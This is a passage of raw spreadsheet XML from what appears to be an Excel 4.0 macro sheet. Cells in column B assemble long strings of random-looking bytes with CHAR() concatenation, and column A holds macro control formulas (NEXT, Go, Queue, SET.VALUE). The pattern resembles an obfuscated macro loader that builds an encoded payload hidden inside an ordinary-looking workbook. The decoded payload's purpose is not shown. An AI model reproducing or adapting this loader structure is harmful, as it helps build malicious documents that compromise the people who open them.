        <f>CHAR(91)&amp;CHAR(64)&amp;CHAR(250)&amp;CHAR(167)&amp;CHAR(42)&amp;CHAR(237)&amp;CHAR(71)&amp;CHAR(176)&amp;CHAR(51)&amp;CHAR(197)&amp;CHAR(105)&amp;CHAR(197)&amp;CHAR(73)&amp;CHAR(40)&amp;CHAR(114)&amp;CHAR(132)&amp;CHAR(19)&amp;CHAR(52)&amp;CHAR(3)&amp;CHAR(56)&amp;CHAR(245)&amp;CHAR(198)&amp;CHAR(5)&amp;CHAR(127)&amp;CHAR(87)&amp;CHAR(55)&amp;CHAR(22)&amp;CHAR(234)&amp;CHAR(39)&amp;CHAR(176)&amp;CHAR(174)&amp;CHAR(155)&amp;CHAR(73)&amp;CHAR(77)&amp;CHAR(123)&amp;CHAR(53)&amp;CHAR(235)&amp;CHAR(19)&amp;CHAR(59)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(102)&amp;CHAR(14)&amp;CHAR(241)&amp;CHAR(58)&amp;CHAR(239)&amp;CHAR(81)&amp;CHAR(2)&amp;CHAR(255)&amp;CHAR(52)&amp;CHAR(136)&amp;CHAR(119)&amp;CHAR(10)&amp;CHAR(44)&amp;CHAR(210)&amp;CHAR(9)&amp;CHAR(69)&amp;CHAR(231)&amp;CHAR(152)&amp;CHAR(153)&amp;CHAR(209)&amp;CHAR(252)&amp;CHAR(118)&amp;CHAR(248)&amp;CHAR(210)&amp;CHAR(7)&amp;CHAR(218)&amp;CHAR(108)&amp;CHAR(101)&amp;CHAR(42)&amp;CHAR(231)&amp;CHAR(7)&amp;CHAR(58)&amp;CHAR(230)&amp;CHAR(223)&amp;CHAR(72)&amp;CHAR(240)&amp;CHAR(247)&amp;CHAR(182)&amp;CHAR(247)&amp;CHAR(207)&amp;CHAR(232)&amp;CHAR(207)&amp;CHAR(36)&amp;CHAR(101)&amp;CHAR(229)&amp;CHAR(191)&amp;CHAR(222)&amp;CHAR(181)&amp;CHAR(224)&amp;CHAR(50)&amp;CHAR(158)&amp;CHAR(71)&amp;CHAR(204)&amp;CHAR(131)&amp;CHAR(247)&amp;CHAR(178)&amp;CHAR(150)&amp;CHAR(160)&amp;CHAR(158)&amp;CHAR(168)&amp;CHAR(82)&amp;CHAR(40)&amp;CHAR(228)&amp;CHAR(66)&amp;CHAR(88)&amp;CHAR(50)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(78)&amp;CHAR(254)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(57)&amp;CHAR(140)&amp;CHAR(159)&amp;CHAR(49)&amp;CHAR(202)&amp;CHAR(56)&amp;CHAR(57)&amp;CHAR(2)&amp;CHAR(177)&amp;CHAR(196)&amp;CHAR(58)&amp;CHAR(197)&amp;CHAR(167)&amp;CHAR(218)&amp;CHAR(159)&amp;CHAR(24)&amp;CHAR(11)&amp;CHAR(177)&amp;CHAR(231)&amp;CHAR(128)&amp;CHAR(66)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(11)&amp;CHAR(243)&amp;CHAR(77)&amp;CHAR(18)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(28)&amp;CHAR(55)&amp;CHAR(6)&amp;CHAR(83)&amp;CHAR(143)&amp;CHAR(214)&amp;CHAR(124)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(173)&amp;CHAR(231)&amp;CHAR(68)&amp;CHAR(68)&amp;CHAR(110)&amp;CHAR(241)&amp;CHAR(211)&amp;CHAR(197)&amp;CHAR(26)&amp;CHAR(250)&amp;CHAR(48)&amp;CHAR(254)&amp;CHAR(194)&amp;CHAR(163)&amp;CHAR(24)&amp;CHAR(154)&amp;CHAR(125)&amp;CHAR(37)&amp;CHAR(28)&amp;CHAR(189)&amp;CHAR(246)&amp;CHAR(183)&amp;CHAR(85)&amp;CHAR(26)&amp;CHAR(139)&amp;CHAR(206)&amp;CHAR(214)&amp;CHAR(253)&amp;CHAR(13)&amp;CHAR(176)&amp;CHAR(141)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(180)&amp;CHAR(142)&amp;CHAR(208)&amp;CHAR(144)&amp;CHAR(49)&amp;CHAR(241)&amp;CHAR(242)&amp;CHAR(16)&amp;CHAR(52)&amp;CHAR(44)&amp;CHAR(79)&amp;CHAR(199)&amp;CHAR(79)&amp;CHAR(107)&amp;CHAR(162)&amp;CHAR(154)&amp;CHAR(101)&amp;CHAR(194)&amp;CHAR(26)&amp;CHAR(161)&amp;CHAR(139)&amp;CHAR(148)&amp;CHAR(151)&amp;CHAR(155)&amp;CHAR(49)&amp;CHAR(167)&amp;CHAR(158)&amp;CHAR(211)&amp;CHAR(142)&amp;CHAR(196)&amp;CHAR(64)&amp;CHAR(11)&amp;CHAR(169)&amp;CHAR(198)&amp;CHAR(253)&amp;CHAR(54)&amp;CHAR(217)&amp;CHAR(12)&amp;CHAR(188)&amp;CHAR(44)&amp;CHAR(172)&amp;CHAR(23)&amp;CHAR(196)&amp;CHAR(219)&amp;CHAR(228)&amp;CHAR(57)&amp;CHAR(42)&amp;CHAR(149)&amp;CHAR(53)&amp;CHAR(91)&amp;CHAR(123)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(248)&amp;CHAR(158)&amp;CHAR(76)&amp;CHAR(71)&amp;CHAR(147)&amp;CHAR(217)&amp;CHAR(104)&amp;CHAR(47)&amp;CHAR(55)&amp;CHAR(184)&amp;CHAR(1)&amp;CHAR(29)&amp;CHAR(228)&amp;CHAR(125)&amp;CHAR(38)&amp;CHAR(226)</f>
        <v>[@ú§*íG°3ÅiÅI(r„_x0013_4_x0003_8õÆ_x0005_W7_x0016_ê'°®›IM{5ë_x0013_;F!_x001E_f_x000E_ñ:ïQ_x0002_ÿ4ˆw
,Ò	Eç˜™ÑüvøÒ_x0007_Úle*ç_x0007_:æßHð÷¶÷ÏèÏ$eå¿Þµà2žGÌƒ÷²– ž¨R(äBX2‚_x0002_Nþ€Ó9ŒŸ1Ê89_x0002_±Ä:Å§ÚŸ_x0018__x000B_±ç€B_x0002__x0006_‰_x000B_óM_x0012__x0007_
_x001C_7_x0006_SÖ|ŒF­çDDnñÓÅ_x001A_ú0þÂ£_x0018_š}%_x001C_½ö·U_x001A_‹ÎÖý_x000D_°_x0006_´ŽÐ1ñò_x0010_4,OÇOk¢šeÂ_x001A_¡‹”—›1§žÓŽÄ@_x000B_©Æý6Ù_x000C_¼,¬_x0017_ÄÛä9*•5[{u0øžLG“Ùh/7¸_x0001__x001D_ä}&amp;â</v>
      </c>
      <c r="C36" t="str">
        <f>CHAR(57)&amp;CHAR(247)&amp;CHAR(157)&amp;CHAR(140)&amp;CHAR(151)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(188)&amp;CHAR(252)&amp;CHAR(119)</f>
        <v>9÷Œ—[¸¼üw</v>
      </c>
    </row>
    <row r="37" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A37" t="b">
        <f>NEXT()</f>
        <v>0</v>
      </c>
      <c r="B37" t="str">
        <f>CHAR(96)&amp;CHAR(25)&amp;CHAR(238)&amp;CHAR(78)&amp;CHAR(115)&amp;CHAR(35)&amp;CHAR(227)&amp;CHAR(242)&amp;CHAR(196)&amp;CHAR(168)&amp;CHAR(101)&amp;CHAR(5)&amp;CHAR(65)&amp;CHAR(93)&amp;CHAR(135)&amp;CHAR(233)&amp;CHAR(240)&amp;CHAR(136)&amp;CHAR(17)&amp;CHAR(53)&amp;CHAR(211)&amp;CHAR(113)&amp;CHAR(122)&amp;CHAR(12)&amp;CHAR(117)&amp;CHAR(58)&amp;CHAR(47)&amp;CHAR(243)&amp;CHAR(111)&amp;CHAR(172)&amp;CHAR(183)&amp;CHAR(145)&amp;CHAR(71)&amp;CHAR(219)&amp;CHAR(25)&amp;CHAR(214)&amp;CHAR(95)&amp;CHAR(91)&amp;CHAR(69)&amp;CHAR(75)&amp;CHAR(70)&amp;CHAR(144)&amp;CHAR(232)&amp;CHAR(115)&amp;CHAR(69)&amp;CHAR(228)&amp;CHAR(167)&amp;CHAR(239)&amp;CHAR(179)&amp;CHAR(70)&amp;CHAR(138)&amp;CHAR(101)&amp;CHAR(186)&amp;CHAR(211)&amp;CHAR(105)&amp;CHAR(17)&amp;CHAR(158)&amp;CHAR(159)&amp;CHAR(96)&amp;CHAR(171)&amp;CHAR(74)&amp;CHAR(76)&amp;CHAR(150)&amp;CHAR(246)&amp;CHAR(168)&amp;CHAR(161)&amp;CHAR(104)&amp;CHAR(101)&amp;CHAR(176)&amp;CHAR(215)&amp;CHAR(79)&amp;CHAR(25)&amp;CHAR(100)&amp;CHAR(26)&amp;CHAR(174)&amp;CHAR(221)&amp;CHAR(192)&amp;CHAR(151)&amp;CHAR(125)&amp;CHAR(68)&amp;CHAR(137)&amp;CHAR(68)&amp;CHAR(146)&amp;CHAR(74)&amp;CHAR(239)&amp;CHAR(18)&amp;CHAR(59)&amp;CHAR(144)&amp;CHAR(38)&amp;CHAR(247)&amp;CHAR(108)&amp;CHAR(76)&amp;CHAR(117)&amp;CHAR(7)&amp;CHAR(123)&amp;CHAR(127)&amp;CHAR(242)&amp;CHAR(178)&amp;CHAR(117)&amp;CHAR(137)&amp;CHAR(246)&amp;CHAR(70)&amp;CHAR(122)&amp;CHAR(22)&amp;CHAR(148)&amp;CHAR(138)&amp;CHAR(38)&amp;CHAR(92)&amp;CHAR(239)&amp;CHAR(49)&amp;CHAR(77)&amp;CHAR(19)&amp;CHAR(247)&amp;CHAR(239)&amp;CHAR(39)&amp;CHAR(207)&amp;CHAR(105)&amp;CHAR(5)&amp;CHAR(200)&amp;CHAR(214)&amp;CHAR(224)&amp;CHAR(254)&amp;CHAR(38)&amp;CHAR(37)&amp;CHAR(162)&amp;CHAR(139)&amp;CHAR(201)&amp;CHAR(31)&amp;CHAR(113)&amp;CHAR(149)&amp;CHAR(216)&amp;CHAR(69)&amp;CHAR(124)&amp;CHAR(160)&amp;CHAR(42)&amp;CHAR(178)&amp;CHAR(42)&amp;CHAR(172)&amp;CHAR(174)&amp;CHAR(192)&amp;CHAR(125)&amp;CHAR(132)&amp;CHAR(49)&amp;CHAR(172)&amp;CHAR(207)&amp;CHAR(255)&amp;CHAR(76)&amp;CHAR(102)&amp;CHAR(120)&amp;CHAR(28)&amp;CHAR(201)&amp;CHAR(114)&amp;CHAR(50)&amp;CHAR(89)&amp;CHAR(19)&amp;CHAR(3)&amp;CHAR(249)&amp;CHAR(152)&amp;CHAR(166)&amp;CHAR(245)&amp;CHAR(115)&amp;CHAR(48)&amp;CHAR(71)&amp;CHAR(144)&amp;CHAR(224)&amp;CHAR(57)&amp;CHAR(73)&amp;CHAR(237)&amp;CHAR(171)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(240)&amp;CHAR(136)&amp;CHAR(15)&amp;CHAR(204)&amp;CHAR(27)&amp;CHAR(230)&amp;CHAR(246)&amp;CHAR(127)&amp;CHAR(91)&amp;CHAR(91)&amp;CHAR(209)&amp;CHAR(76)&amp;CHAR(20)&amp;CHAR(171)&amp;CHAR(86)&amp;CHAR(71)&amp;CHAR(114)&amp;CHAR(164)&amp;CHAR(227)&amp;CHAR(209)&amp;CHAR(10)&amp;CHAR(232)&amp;CHAR(107)&amp;CHAR(166)&amp;CHAR(119)&amp;CHAR(85)&amp;CHAR(145)&amp;CHAR(226)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(13)&amp;CHAR(38)&amp;CHAR(205)&amp;CHAR(87)&amp;CHAR(153)&amp;CHAR(149)&amp;CHAR(230)&amp;CHAR(64)&amp;CHAR(199)&amp;CHAR(181)&amp;CHAR(56)&amp;CHAR(46)&amp;CHAR(158)&amp;CHAR(239)&amp;CHAR(126)&amp;CHAR(113)&amp;CHAR(206)&amp;CHAR(241)&amp;CHAR(109)&amp;CHAR(40)&amp;CHAR(255)&amp;CHAR(82)&amp;CHAR(68)&amp;CHAR(129)&amp;CHAR(187)&amp;CHAR(61)&amp;CHAR(130)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(108)&amp;CHAR(254)&amp;CHAR(65)&amp;CHAR(138)&amp;CHAR(96)&amp;CHAR(222)&amp;CHAR(32)&amp;CHAR(154)&amp;CHAR(73)&amp;CHAR(74)&amp;CHAR(33)&amp;CHAR(45)&amp;CHAR(179)&amp;CHAR(43)&amp;CHAR(215)&amp;CHAR(111)&amp;CHAR(252)&amp;CHAR(248)&amp;CHAR(127)&amp;CHAR(2)&amp;CHAR(112)&amp;CHAR(72)&amp;CHAR(235)&amp;CHAR(79)&amp;CHAR(133)</f>
        <v>`_x0019_îNs#ãòÄ¨e_x0005_A]‡éðˆ_x0011_5Óqz_x000C_u:/óo¬·‘GÛ_x0019_Ö_[EKFèsEä§ï³FŠeºÓi_x0011_žŸ`«JL–ö¨¡he°×O_x0019_d_x001A_®ÝÀ—}D‰D’Jï_x0012_;&amp;÷lLu_x0007_{ò²u‰öFz_x0016_”Š&amp;\ï1M_x0013_÷ï'Ïi_x0005_ÈÖàþ&amp;%¢‹É_x001F_q•ØE| *²*¬®À}„1¬ÏÿLfx_x001C_Ér2Y_x0013__x0003_ù˜¦õs0Gà9Ií«ŽAðˆ_x000F_Ì_x001B_æö[[ÑL_x0014_«VGr¤ãÑ
èk¦wU‘â_x0006_‚_x000D_&amp;ÍW™•æ@Çµ8.žï~qÎñm(ÿRD»=‚6…lþAŠ`Þ šIJ!-³+×oüø_x0002_pHëO…</v>
      </c>
      <c r="C37" t="str">
        <f>CHAR(144)&amp;CHAR(236)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(80)&amp;CHAR(33)&amp;CHAR(114)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(143)</f>
        <v>ì‘[P!rzˆ</v>
      </c>
    </row>
    <row r="38" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A38" t="e">
        <f>Queue(A22,-2,0)</f>
        <v>#NAME?</v>
      </c>
      <c r="B38" t="str">
        <f>CHAR(3)&amp;CHAR(165)&amp;CHAR(97)&amp;CHAR(233)&amp;CHAR(1)&amp;CHAR(78)&amp;CHAR(61)&amp;CHAR(39)&amp;CHAR(197)&amp;CHAR(192)&amp;CHAR(4)&amp;CHAR(72)&amp;CHAR(6)&amp;CHAR(128)&amp;CHAR(212)&amp;CHAR(251)&amp;CHAR(49)&amp;CHAR(8)&amp;CHAR(80)&amp;CHAR(3)&amp;CHAR(30)&amp;CHAR(94)&amp;CHAR(51)&amp;CHAR(200)&amp;CHAR(44)&amp;CHAR(169)&amp;CHAR(22)&amp;CHAR(154)&amp;CHAR(139)&amp;CHAR(51)&amp;CHAR(11)&amp;CHAR(161)&amp;CHAR(151)&amp;CHAR(13)&amp;CHAR(217)&amp;CHAR(13)&amp;CHAR(99)&amp;CHAR(118)&amp;CHAR(93)&amp;CHAR(149)&amp;CHAR(194)&amp;CHAR(191)&amp;CHAR(150)&amp;CHAR(117)&amp;CHAR(178)&amp;CHAR(1)&amp;CHAR(85)&amp;CHAR(194)&amp;CHAR(125)&amp;CHAR(58)&amp;CHAR(199)&amp;CHAR(145)&amp;CHAR(194)&amp;CHAR(91)&amp;CHAR(214)&amp;CHAR(193)&amp;CHAR(182)&amp;CHAR(221)&amp;CHAR(238)&amp;CHAR(249)&amp;CHAR(102)&amp;CHAR(114)&amp;CHAR(198)&amp;CHAR(86)&amp;CHAR(197)&amp;CHAR(171)&amp;CHAR(177)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(126)&amp;CHAR(206)&amp;CHAR(216)&amp;CHAR(242)&amp;CHAR(102)&amp;CHAR(79)&amp;CHAR(216)&amp;CHAR(221)&amp;CHAR(2)&amp;CHAR(23)&amp;CHAR(221)&amp;CHAR(3)&amp;CHAR(13)&amp;CHAR(50)&amp;CHAR(242)&amp;CHAR(13)&amp;CHAR(181)&amp;CHAR(126)&amp;CHAR(18)&amp;CHAR(136)&amp;CHAR(178)&amp;CHAR(113)&amp;CHAR(157)&amp;CHAR(53)&amp;CHAR(66)&amp;CHAR(90)&amp;CHAR(90)&amp;CHAR(93)&amp;CHAR(9)&amp;CHAR(226)&amp;CHAR(248)&amp;CHAR(247)&amp;CHAR(159)&amp;CHAR(113)&amp;CHAR(33)&amp;CHAR(26)&amp;CHAR(58)&amp;CHAR(206)&amp;CHAR(64)&amp;CHAR(220)&amp;CHAR(215)&amp;CHAR(131)&amp;CHAR(189)&amp;CHAR(253)&amp;CHAR(71)&amp;CHAR(221)&amp;CHAR(80)&amp;CHAR(132)&amp;CHAR(158)&amp;CHAR(56)&amp;CHAR(129)&amp;CHAR(50)&amp;CHAR(96)&amp;CHAR(89)&amp;CHAR(99)&amp;CHAR(224)&amp;CHAR(224)&amp;CHAR(152)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(104)&amp;CHAR(88)&amp;CHAR(72)&amp;CHAR(223)&amp;CHAR(172)&amp;CHAR(14)&amp;CHAR(122)&amp;CHAR(197)&amp;CHAR(99)&amp;CHAR(36)&amp;CHAR(156)&amp;CHAR(46)&amp;CHAR(43)&amp;CHAR(241)&amp;CHAR(193)&amp;CHAR(101)&amp;CHAR(20)&amp;CHAR(169)&amp;CHAR(155)&amp;CHAR(243)&amp;CHAR(87)&amp;CHAR(212)&amp;CHAR(71)&amp;CHAR(222)&amp;CHAR(114)&amp;CHAR(158)&amp;CHAR(32)&amp;CHAR(249)&amp;CHAR(2)&amp;CHAR(206)&amp;CHAR(109)&amp;CHAR(35)&amp;CHAR(1)&amp;CHAR(97)&amp;CHAR(41)&amp;CHAR(158)&amp;CHAR(233)&amp;CHAR(32)&amp;CHAR(176)&amp;CHAR(252)&amp;CHAR(202)&amp;CHAR(104)&amp;CHAR(88)&amp;CHAR(229)&amp;CHAR(48)&amp;CHAR(185)&amp;CHAR(77)&amp;CHAR(152)&amp;CHAR(151)&amp;CHAR(87)&amp;CHAR(117)&amp;CHAR(228)&amp;CHAR(41)&amp;CHAR(20)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(165)&amp;CHAR(121)&amp;CHAR(241)&amp;CHAR(178)&amp;CHAR(121)&amp;CHAR(162)&amp;CHAR(17)&amp;CHAR(64)&amp;CHAR(100)&amp;CHAR(204)&amp;CHAR(60)&amp;CHAR(163)&amp;CHAR(17)&amp;CHAR(56)&amp;CHAR(148)&amp;CHAR(185)&amp;CHAR(38)&amp;CHAR(58)&amp;CHAR(122)&amp;CHAR(190)&amp;CHAR(169)&amp;CHAR(199)&amp;CHAR(195)&amp;CHAR(100)&amp;CHAR(94)&amp;CHAR(113)&amp;CHAR(78)&amp;CHAR(245)&amp;CHAR(128)&amp;CHAR(74)&amp;CHAR(121)&amp;CHAR(184)&amp;CHAR(196)&amp;CHAR(218)&amp;CHAR(236)&amp;CHAR(255)&amp;CHAR(21)&amp;CHAR(226)&amp;CHAR(27)&amp;CHAR(58)&amp;CHAR(155)&amp;CHAR(74)&amp;CHAR(43)&amp;CHAR(109)&amp;CHAR(25)&amp;CHAR(163)&amp;CHAR(95)&amp;CHAR(253)&amp;CHAR(162)&amp;CHAR(131)&amp;CHAR(168)&amp;CHAR(26)&amp;CHAR(212)&amp;CHAR(41)&amp;CHAR(203)&amp;CHAR(98)&amp;CHAR(78)&amp;CHAR(191)&amp;CHAR(10)&amp;CHAR(12)&amp;CHAR(107)&amp;CHAR(71)&amp;CHAR(112)&amp;CHAR(233)&amp;CHAR(6)&amp;CHAR(253)&amp;CHAR(40)&amp;CHAR(78)&amp;CHAR(13)&amp;CHAR(186)</f>
        <v>_x0003_¥aé_x0001_N='ÅÀ_x0004_H_x0006_€Ôû1_x0008_P_x0003__x001E_^3È,©_x0016_š‹3_x000B_¡—_x000D_Ù_x000D_cv]•Â¿–u²_x0001_UÂ}:Ç‘Â[ÖÁ¶ÝîùfrÆVÅ«±_x0013_
~ÎØòfOØÝ_x0002__x0017_Ý_x0003__x000D_2ò_x000D_µ~_x0012_ˆ²q5BZZ]	âø÷Ÿq!_x001A_:Î@Ü×ƒ½ýGÝP„ž82`Ycàà˜VVhXHß¬_x000E_zÅc$œ.+ñÁe_x0014_©›óWÔGÞrž ù_x0002_Îm#_x0001_a)žé °üÊhXå0¹M˜—Wuä)_x0014_Ž_x0001_¥yñ²y¢_x0011_@dÌ&lt;£_x0011_8”¹&amp;:z¾©ÇÃd^qNõ€Jy¸ÄÚìÿ_x0015_â_x001B_:›J+m_x0019_£_ý¢ƒ¨_x001A_Ô)ËbN¿
_x000C_kGpé_x0006_ý(N_x000D_º</v>
      </c>
      <c r="C38" t="str">
        <f>CHAR(217)&amp;CHAR(208)&amp;CHAR(140)&amp;CHAR(209)&amp;CHAR(89)&amp;CHAR(122)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(217)&amp;CHAR(216)</f>
        <v>ÙÐŒÑYzˆêÙØ</v>
      </c>
    </row>
    <row r="39" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A39" t="e">
        <f>Go()</f>
        <v>#NAME?</v>
      </c>
      <c r="B39" t="str">
        <f>CHAR(228)&amp;CHAR(195)&amp;CHAR(249)&amp;CHAR(157)&amp;CHAR(34)&amp;CHAR(212)&amp;CHAR(86)&amp;CHAR(174)&amp;CHAR(151)&amp;CHAR(222)&amp;CHAR(224)&amp;CHAR(174)&amp;CHAR(52)&amp;CHAR(159)&amp;CHAR(20)&amp;CHAR(178)&amp;CHAR(173)&amp;CHAR(210)&amp;CHAR(80)&amp;CHAR(252)&amp;CHAR(99)&amp;CHAR(252)&amp;CHAR(135)&amp;CHAR(165)&amp;CHAR(36)&amp;CHAR(11)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(87)&amp;CHAR(151)&amp;CHAR(35)&amp;CHAR(205)&amp;CHAR(50)&amp;CHAR(78)&amp;CHAR(98)&amp;CHAR(6)&amp;CHAR(133)&amp;CHAR(228)&amp;CHAR(185)&amp;CHAR(112)&amp;CHAR(104)&amp;CHAR(238)&amp;CHAR(187)&amp;CHAR(164)&amp;CHAR(218)&amp;CHAR(24)&amp;CHAR(248)&amp;CHAR(144)&amp;CHAR(174)&amp;CHAR(156)&amp;CHAR(249)&amp;CHAR(36)&amp;CHAR(210)&amp;CHAR(209)&amp;CHAR(42)&amp;CHAR(41)&amp;CHAR(106)&amp;CHAR(144)&amp;CHAR(89)&amp;CHAR(56)&amp;CHAR(193)&amp;CHAR(6)&amp;CHAR(51)&amp;CHAR(138)&amp;CHAR(130)&amp;CHAR(36)&amp;CHAR(119)&amp;CHAR(127)&amp;CHAR(19)&amp;CHAR(182)&amp;CHAR(10)&amp;CHAR(94)&amp;CHAR(246)&amp;CHAR(176)&amp;CHAR(167)&amp;CHAR(246)&amp;CHAR(252)&amp;CHAR(116)&amp;CHAR(1)&amp;CHAR(66)&amp;CHAR(77)&amp;CHAR(95)&amp;CHAR(201)&amp;CHAR(169)&amp;CHAR(187)&amp;CHAR(123)&amp;CHAR(58)&amp;CHAR(165)&amp;CHAR(191)&amp;CHAR(14)&amp;CHAR(140)&amp;CHAR(239)&amp;CHAR(94)&amp;CHAR(138)&amp;CHAR(192)&amp;CHAR(6)&amp;CHAR(56)&amp;CHAR(1)&amp;CHAR(94)&amp;CHAR(57)&amp;CHAR(129)&amp;CHAR(215)&amp;CHAR(170)&amp;CHAR(85)&amp;CHAR(237)&amp;CHAR(63)&amp;CHAR(191)&amp;CHAR(204)&amp;CHAR(242)&amp;CHAR(216)&amp;CHAR(66)&amp;CHAR(246)&amp;CHAR(115)&amp;CHAR(116)&amp;CHAR(237)&amp;CHAR(21)&amp;CHAR(5)&amp;CHAR(233)&amp;CHAR(157)&amp;CHAR(64)&amp;CHAR(194)&amp;CHAR(253)&amp;CHAR(7)&amp;CHAR(106)&amp;CHAR(138)&amp;CHAR(252)&amp;CHAR(48)&amp;CHAR(161)&amp;CHAR(72)&amp;CHAR(151)&amp;CHAR(33)&amp;CHAR(27)&amp;CHAR(18)&amp;CHAR(12)&amp;CHAR(99)&amp;CHAR(37)&amp;CHAR(62)&amp;CHAR(173)&amp;CHAR(226)&amp;CHAR(206)&amp;CHAR(219)&amp;CHAR(104)&amp;CHAR(138)&amp;CHAR(15)&amp;CHAR(228)&amp;CHAR(129)&amp;CHAR(35)&amp;CHAR(142)&amp;CHAR(168)&amp;CHAR(28)&amp;CHAR(173)&amp;CHAR(42)&amp;CHAR(32)&amp;CHAR(173)&amp;CHAR(47)&amp;CHAR(13)&amp;CHAR(161)&amp;CHAR(210)&amp;CHAR(45)&amp;CHAR(193)&amp;CHAR(198)&amp;CHAR(182)&amp;CHAR(166)&amp;CHAR(148)&amp;CHAR(192)&amp;CHAR(34)&amp;CHAR(52)&amp;CHAR(246)&amp;CHAR(149)&amp;CHAR(59)&amp;CHAR(87)&amp;CHAR(204)&amp;CHAR(86)&amp;CHAR(2)&amp;CHAR(43)&amp;CHAR(223)&amp;CHAR(7)&amp;CHAR(138)&amp;CHAR(200)&amp;CHAR(114)&amp;CHAR(6)&amp;CHAR(27)&amp;CHAR(130)&amp;CHAR(63)&amp;CHAR(147)&amp;CHAR(225)&amp;CHAR(121)&amp;CHAR(35)&amp;CHAR(105)&amp;CHAR(217)&amp;CHAR(181)&amp;CHAR(180)&amp;CHAR(224)&amp;CHAR(120)&amp;CHAR(235)&amp;CHAR(47)&amp;CHAR(84)&amp;CHAR(77)&amp;CHAR(249)&amp;CHAR(77)&amp;CHAR(107)&amp;CHAR(243)&amp;CHAR(137)&amp;CHAR(48)&amp;CHAR(10)&amp;CHAR(80)&amp;CHAR(217)&amp;CHAR(34)&amp;CHAR(2)&amp;CHAR(159)&amp;CHAR(126)&amp;CHAR(141)&amp;CHAR(137)&amp;CHAR(215)&amp;CHAR(234)&amp;CHAR(45)&amp;CHAR(10)&amp;CHAR(135)&amp;CHAR(154)&amp;CHAR(132)&amp;CHAR(3)&amp;CHAR(130)&amp;CHAR(194)&amp;CHAR(191)&amp;CHAR(2)&amp;CHAR(109)&amp;CHAR(68)&amp;CHAR(156)&amp;CHAR(47)&amp;CHAR(224)&amp;CHAR(147)&amp;CHAR(197)&amp;CHAR(113)&amp;CHAR(170)&amp;CHAR(219)&amp;CHAR(76)&amp;CHAR(229)&amp;CHAR(106)&amp;CHAR(139)&amp;CHAR(89)&amp;CHAR(50)&amp;CHAR(61)&amp;CHAR(171)&amp;CHAR(36)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(95)&amp;CHAR(199)&amp;CHAR(128)&amp;CHAR(215)&amp;CHAR(155)&amp;CHAR(101)&amp;CHAR(95)&amp;CHAR(252)&amp;CHAR(134)</f>
        <v>äÃù"ÔV®—Þà®4Ÿ_x0014_²­ÒPücü‡¥$_x000B_‚	W—#Í2Nb_x0006_…ä¹phî»¤Ú_x0018_ø®œù$ÒÑ*)jY8Á_x0006_3Š‚$w_x0013_¶
^ö°§öüt_x0001_BM_É©»{:¥¿_x000E_Œï^ŠÀ_x0006_8_x0001_^9×ªUí?¿ÌòØBöstí_x0015__x0005_é@Âý_x0007_jŠü0¡H—!_x001B__x0012__x000C_c%&gt;­âÎÛhŠ_x000F_ä#Ž¨_x001C_­* ­/_x000D_¡Ò-ÁÆ¶¦”À"4ö•;WÌV_x0002_+ß_x0007_ŠÈr_x0006__x001B_‚?“áy#iÙµ´àxë/TMùMkó‰0
PÙ"_x0002_Ÿ~‰×ê-
‡š„_x0003_‚Â¿_x0002_mDœ/à“ÅqªÛLåj‹Y2=«$	†_Ç€×›e_ü†</v>
      </c>
      <c r="C39" t="str">
        <f>CHAR(126)&amp;CHAR(188)&amp;CHAR(56)&amp;CHAR(243)&amp;CHAR(120)&amp;CHAR(162)&amp;CHAR(28)&amp;CHAR(78)&amp;CHAR(225)&amp;CHAR(242)</f>
        <v>~¼8óx¢_x001C_Náò</v>
      </c>
    </row>
    <row r="40" spans="1:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="A40" t="b">
        <f>SET.VALUE(A22,0)</f>
        <v>0</v>
      </c>
      <c r="B40" t="str">
        <f>CHAR(213)&amp;CHAR(78)&amp;CHAR(158)&amp;CHAR(161)&amp;CHAR(100)&amp;CHAR(209)&amp;CHAR(160)&amp;CHAR(144)&amp;CHAR(5)&amp;CHAR(67)&amp;CHAR(82)&amp;CHAR(226)&amp;CHAR(240)&amp;CHAR(203)&amp;CHAR(22)&amp;CHAR(103)&amp;CHAR(6)&amp;CHAR(253)&amp;CHAR(203)&amp;CHAR(222)&amp;CHAR(173)&amp;CHAR(6)&amp;CHAR(178)&amp;CHAR(191)&amp;CHAR(90)&amp;CHAR(163)&amp;CHAR(150)&amp;CHAR(4)&amp;CHAR(4)&amp;CHAR(139)&amp;CHAR(61)&amp;CHAR(116)&amp;CHAR(245)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(100)&amp;CHAR(2)&amp;CHAR(42)&amp;CHAR(182)&amp;CHAR(146)&amp;CHAR(235)&amp;CHAR(32)&amp;CHAR(84)&amp;CHAR(149)&amp;CHAR(25)&amp;CHAR(11)&amp;CHAR(240)&amp;CHAR(249)&amp;CHAR(37)&amp;CHAR(130)&amp;CHAR(166)&amp;CHAR(120)&amp;CHAR(58)&amp;CHAR(96)&amp;CHAR(162)&amp;CHAR(251)&amp;CHAR(203)&amp;CHAR(11)&amp;CHAR(146)&amp;CHAR(172)&amp;CHAR(51)&amp;CHAR(120)&amp;CHAR(218)&amp;CHAR(22)&amp;CHAR(65)&amp;CHAR(179)&amp;CHAR(4)&amp;CHAR(227)&amp;CHAR(61)&amp;CHAR(103)&amp;CHAR(6)&amp;CHAR(54)&amp;CHAR(142)&amp;CHAR(191)&amp;CHAR(39)&amp;CHAR(223)&amp;C